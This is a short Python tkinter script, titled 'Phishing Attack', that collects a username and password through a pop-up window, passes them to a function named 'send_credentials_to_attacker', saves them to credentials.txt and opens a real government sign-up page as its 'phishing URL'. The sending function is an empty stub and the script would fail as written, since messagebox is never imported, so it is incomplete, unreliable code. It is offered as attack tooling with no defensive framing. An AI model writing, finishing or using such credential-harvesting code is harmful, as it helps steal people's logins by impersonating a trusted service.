import tkinter as tk
import webbrowser

def send_credentials_to_attacker(url, username, password):
    # Code to send the user's credentials to the attacker's server
    pass

def generate_phishing_attack():
    def submit_credentials():
        username = username_entry.get()
        password = password_entry.get()
        send_credentials_to_attacker(phishing_url, username, password)
        
        # Save the credentials to a file
        with open("credentials.txt", "w") as file:
            file.write(f"Username: {username}\nPassword: {password}")
        
        tk.messagebox.showinfo("Success", "Credentials saved to credentials.txt")
        root.destroy()

    phishing_url = "https://secure.login.gov/sign_up/enter_email"

    root = tk.Tk()
    root.title("Phishing Attack")

    username_label = tk.Label(root, text="Enter your username:")
    username_label.pack()
    username_entry = tk.Entry(root)
    username_entry.pack()

    password_label = tk.Label(root, text="Enter your password:")
    password_label.pack()
    password_entry = tk.Entry(root, show="*")
    password_entry.pack()

    submit_button = tk.Button(root, text="Submit", command=submit_credentials)
    submit_button.pack()

    open_browser_button = tk.Button(root, text="Open Phishing URL in Browser", command=lambda: webbrowser.open(phishing_url))
    open_browser_button.pack()

    root.mainloop()

# Call the function to generate the phishing attack
generate_phishing_attack()
